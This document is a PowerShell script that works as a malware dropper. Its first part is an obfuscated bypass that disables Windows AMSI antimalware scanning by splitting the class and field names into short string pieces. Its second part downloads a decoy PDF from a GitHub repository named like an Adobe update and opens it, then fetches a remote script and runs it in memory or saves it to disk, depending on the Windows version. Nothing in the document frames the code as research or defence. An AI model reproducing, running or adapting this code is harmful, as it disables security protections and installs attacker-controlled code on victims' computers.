try {

    $uggiukP = 'Sy'
    $osiqhdcjwoc = '.Man'
    $iouhoaiucio = 'stem'
    $iohsdvppaidhc = 'ment.'
    $iohoidsvopoapv = 'age'
    $hoisdvoapdjvhphav = 'Auto'
    $hpshdvioavpja = 'Utils'
    $ihoaivaohvjaisdhv = 'mation.'
    $oihaovoavsava = 'Am'
    $ihqoiwfoqofqfwq = 'si'


    $usdvhaoihv = 'am'
    $hoHcohchpHvp = 'In'
    $ihoahvoahvo = 'it'
    $oihaohvoahvo = 'Fa'
    $ihohasovoahv = 'il'
    $ihoahsvoihasv = 'ed'

    $hoihasohoshva = 'NonP'
    $ojpaoshvhapshvpahv = 'ubli'
    $iooaisvoaovava = 'c,'
    $ohaphvpahpvpJcC = 'Sta'
    $iasovosaivavspajv = 'tic'




    [Ref].Assembly.GetType($uggiukP + $iouhoaiucio + $osiqhdcjwoc + $iohoidsvopoapv + $iohsdvppaidhc + $hoisdvoapdjvhphav + $ihoaivaohvjaisdhv + $oihaovoavsava + $ihqoiwfoqofqfwq + $hpshdvioavpja).GetField(($usdvhaoihv + $ihqoiwfoqofqfwq + $hoHcohchpHvp + $ihoahvoahvo + $oihaohvoahvo + $ihohasovoahv + $ihoahsvoihasv), ($hoihasohoshva + $ojpaoshvhapshvpahv + $iooaisvoaovava + $ohaphvpahpvpJcC + $iasovosaivavspajv)).SetValue($null, $true)
}
finally {



    $lwoxheihwic = "https://raw.githubusercontent.com/burnitup545/AdobeUpdate/main/random.pdf"

    $osicheuche = 'https://raw.githubusercontent.com/burnitup545/AdobeUpdate/main/lib30.ps1'

    $ishscjsof = 'https://raw.githubusercontent.com/burnitup545/AdobeUpdate/main/AIQlib207.ps1'



    $path = ".\random.pdf"
    (New-Object System.Net.WebClient).DownloadFile($lwoxheihwic, $path)
    Start-Process -F $path





    $OSVersion = (Get-WmiObject Win32_OperatingSystem).Caption


    if ($OSVersion -match "7") {
        IEX ((new-object net.webclient).downloadstring($osicheuche))
    }
    
    if ($OSVersion -match "8") {
        IEX ((new-object net.webclient).downloadstring($osicheuche))
    }
        
    if ($OSVersion -match "10") {
        Add-Content -Path "AIQlib207.ps1" (new-object net.webclient).downloadstring($ishscjsof)
        Get-Location | Write-Output
        Pause
    }



}
